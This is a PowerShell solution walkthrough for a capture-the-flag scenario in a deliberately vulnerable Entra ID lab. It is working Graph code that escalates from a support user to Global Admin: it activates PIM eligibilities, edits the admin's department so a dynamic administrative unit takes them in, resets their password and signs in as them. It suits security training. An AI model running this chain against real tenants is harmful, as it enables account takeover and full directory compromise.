<#
.SYNOPSIS
EntraGoat Scenario 5: Walkthrough solution step-by-step

.DESCRIPTION
________________________________________________________________________________________________________________________________________________
Scenario 5 - Department of Escalations - AU Ready for This?

Attack flow: 

1. The attacker starts as a support user (Sarah Connor) with no direct privileges.
She has eligible membership in "Tier-1 Support Team" and eligible ownership of "Regional Access Coordinators".

2. First, the attacker activates their eligible membership in the support team.
This grants them the "User Profile Administrator" custom role with microsoft.directory/users/basic/update permission.

3. Next, they activate their eligible ownership of the Regional Access Coordinators group.
As owner, they can add themselves as a member of this privileged group.

4. The Regional Access Coordinators group has Privileged Authentication Administrator role.
BUT - it's scoped to the "HR Department" Administrative Unit, which uses dynamic membership.

5. Here's the clever part: Using their user update permission, they change the Global Admin's department to "HR".
This triggers the AU's dynamic membership rule: (user.department -eq "HR").

6. The Global Admin is now automatically added to the HR Department AU.
Since the attacker's group has PAA role scoped to this AU, they can now reset the GA's password.

7. The attacker resets the Global Admin password and signs in to retrieve the flag.
A perfect chain of legitimate features leading to complete compromise.

- - - 

--> So... why this works?
This attack exploits several design assumptions in Azure AD:

1. PIM Eligibility Chains: Eligible ownership allows self-service group management after activation.
   Combined with eligible membership, it creates delayed privilege escalation paths.

2. Dynamic AU Membership: Dynamic rules evaluate in real-time based on user attributes.
   If you can modify attributes, you can manipulate AU membership.

3. Scoped Roles + Dynamic AUs: AU-scoped roles seem limited, but become powerful when
   you can control who enters the AU through attribute manipulation.

4. Basic Update Permission: The seemingly harmless "update user profile" permission
   becomes a weapon when combined with dynamic membership rules.

5. Trust in Attributes: The system trusts that department values are legitimate,
   but any user with update permission can change them.

Common scenarios where this happens:
- Help desk staff given "just" profile update permissions
- PIM used to grant temporary access without considering the implications
- Dynamic AUs created for convenience without considering attribute manipulation
- AU-scoped admin roles assumed to be "safe" due to limited scope

The attack is particularly dangerous because:
- Each step uses legitimate, auditable actions
- PIM activations appear as normal administrative tasks
- Attribute changes look like routine profile updates
- The permission chain is hard to visualize
________________________________________________________________________________________________________________________________________________

.NOTES
Requires: Get-MSGraphTokenWithUsernamePassword function from BARK (https://github.com/BloodHoundAD/BARK)
you must have the function/BARK toolkit loaded in PS memory to use this function but other tools (or Connect-MgGraph) can be used as well.
#>


# Step 1: Connect as support user (has microsoft.directory/users/basic/update permission)
$UPN = "sarah.connor@[YOUR-TENANT-DOMAIN].onmicrosoft.com"
$tenantId = "[YOUR-TENANT-ID]"
$password = "GoatAccess!123"

$userToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
Connect-MgGraph -AccessToken (ConvertTo-SecureString $userToken.access_token -AsPlainText -Force)

$currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"

# Step 2: Enumeration phase
# what groups are we a member of (if any)?
$groupIDs = Get-MgUserMemberOf -UserId $currentUser.Id -All
foreach ($groupID in $groupIDs) {
    Get-MgGroup -GroupId $groupID.Id
}

# Check PIM eligible group assignments - what kinds of eligibilities do we have?
$eligibilities = Invoke-MgGraphRequest -Method GET `
    -Uri "https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/eligibilitySchedules?`$filter=principalId eq '$($currentUser.Id)'"

$eligibilities.value | Select-Object accessId, @{n='GroupId';e={$_.groupId}}, @{n='Status';e={$_.status}}

foreach ($elig in $eligibilities.value) {
    $group = Get-MgGroup -GroupId $elig.groupId
    Write-Host "$($elig.accessId) of group: $($group.DisplayName) -- $($group.Description)" -ForegroundColor Cyan
}

# eligible member of: Tier-1 Support Team
# eligible owner of: Regional Access Coordinators

# What roles do these groups have?
$supportGroup = Get-MgGroup -Filter "displayName eq 'Tier-1 Support Team'"

$roleAssignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($supportGroup.Id)'"
foreach ($ra in $roleAssignments) {
    $roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $ra.RoleDefinitionId
    Write-Host "Role: $($roleDef.DisplayName)" -ForegroundColor Cyan
    Write-Host "Scoped to: $($ra.DirectoryScopeId)" -ForegroundColor Cyan
}

# User Profile Administrator is a custom role - well, let's check its permissions 
$customRole = Get-MgRoleManagementDirectoryRoleDefinition -Filter "displayName eq 'User Profile Administrator'"
$customRole.RolePermissions.AllowedResourceActions
# microsoft.directory/users/basic/update - we can update user attributes!

# what about that Regional Access Coordinators group?
$regGroup = Get-MgGroup -Filter "displayName eq 'Regional Access Coordinators'"

$regGroupRoleAssignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($regGroup.Id)'"
foreach ($ra in $regGroupRoleAssignments) {
    $roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $ra.RoleDefinitionId
    Write-Host "Role: $($roleDef.DisplayName)" -ForegroundColor Cyan
    Write-Host "Scoped to: $($ra.DirectoryScopeId)" -ForegroundColor Cyan
}

# Privileged Authentication Administrator scoped to /administrativeUnits/[AU-ID]

# Ummm.. whats that AU?
$auId = $regGroupRoleAssignments.DirectoryScopeId -replace '/administrativeUnits/',''
$au = Get-MgDirectoryAdministrativeUnit -AdministrativeUnitId $auId
$au | Select-Object DisplayName, MembershipType, MembershipRule

# MembershipRule: (user.department -eq "HR") - so if we can change the department of a user, we can add them to this AU!

<#

So just to recap - if we can:
    1. Activate membership in support team -> Get user update permission
    2. Activate ownership of priv group -> Add ourselves as member
    3. Change someone's department to HR -> They join the AU
    4. We have PAA role over that AU -> Reset their password

#>

# Let's find the admin
$adminUser = Get-MgUser -Filter "startswith(userPrincipalName, 'EntraGoat-admin-s5')"
$adminUser

# Check their current department
$adminDetails = Get-MgUser -UserId $adminUser.Id -Property Department,DisplayName
$adminDetails.Department


# Step 3: Activate eligible group assignments

<#
Note: The following step can also be done via the UI:
    1. entra.microsoft.com -> ID Governance -> Privileged Access Management -> My roles -> Groups
    2. Eligible assignments tab
    3. Click Activate on the wanted group -> fill Reason ("Password reset required for locked HR department user account") -> Activate.
    4. Wait ~ 30 seconds -> re-sign-in or refresh token; role shows as Active.
    5. pwn.
#>

# activate eligible membership in support team
$memberActivationParams = @{
    accessId         = "member"
    principalId      = $currentUser.Id
    groupId          = $supportGroup.Id
    action           = "selfActivate"
    scheduleInfo     = @{
        startDateTime = (Get-Date).ToUniversalTime().ToString("o")
        expiration    = @{ 
            type = "afterDuration"
            duration = "PT8H"
        }
    }
    justification    = "User profile updates required for support tickets"
}


Invoke-MgGraphRequest -Method POST `
    -Uri "https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/assignmentScheduleRequests" `
    -Body $memberActivationParams -ContentType "application/json"


# Activate eligible ownership of "Regional Access Coordinators" group and add ourselves as member
$ownerActivationParams = @{
    accessId         = "owner"
    principalId      = $currentUser.Id
    groupId          = $regGroup.Id
    action           = "selfActivate"
    scheduleInfo     = @{
        startDateTime = (Get-Date).ToUniversalTime().ToString("o")
        expiration    = @{ 
            type = "afterDuration"
            duration = "PT8H"
        }
    }
    justification    = "Regional coordination tasks"
}

Invoke-MgGraphRequest -Method POST `
    -Uri "https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/assignmentScheduleRequests" `
    -Body $ownerActivationParams -ContentType "application/json"

# wait for activations to complete - this may take a while

# Add ourselves to the group
$memberParams = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/users/$($currentUser.Id)"
}
New-MgGroupMemberByRef -GroupId $regGroup.Id -BodyParameter $memberParams

# what groups are we a member of NOW?
$groupIDs = Get-MgUserMemberOf -UserId $currentUser.Id -All
foreach ($groupID in $groupIDs) {
    Get-MgGroup -GroupId $groupID.Id
}

# Refresh token to get new permissions
Disconnect-MgGraph

$newToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
Connect-MgGraph -AccessToken (ConvertTo-SecureString $newToken.access_token -AsPlainText -Force)

# Step 4: Change admin's department to HR and check that it worked
Update-MgUser -UserId $adminUser.Id -Department "HR"

(Get-MgUser -UserId $adminUser.Id -Property Department).Department
# HR

# Wait for AU dynamic membership to process and check if admin is now in the AU
$auMembers = Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $au.Id
$auMembers | Where-Object { $_.Id -eq $adminUser.Id }  # if empty, wait a bit.. dynamic membership can take a few minutes to process


# Step 5: Reset password using the PAA role
$newPwd = "Pwn3d$(Get-Random -Max 9999)!"
Update-MgUser -UserId $adminUser.Id -PasswordProfile @{
    Password = $newPwd
    ForceChangePasswordNextSignIn = $false
}

# Step 6: Login as admin and retrieve the flag
Disconnect-MgGraph
$adminToken = Get-MSGraphTokenWithUsernamePassword -Username $adminUser.UserPrincipalName -Password $newPwd -TenantID $tenantId
Connect-MgGraph -AccessToken (ConvertTo-SecureString $adminToken.access_token -AsPlainText -Force)

# gimme the flag!
Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userPrincipalName,onPremisesExtensionAttributes' |
    Select-Object @{n='UPN';e={$_.userPrincipalName}},
                  @{n='Id';e={$_.id}},
                  @{n='Flag';e={$_.onPremisesExtensionAttributes.extensionAttribute1}}

# Disconnect admin session
Disconnect-MgGraph


# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing the its source code.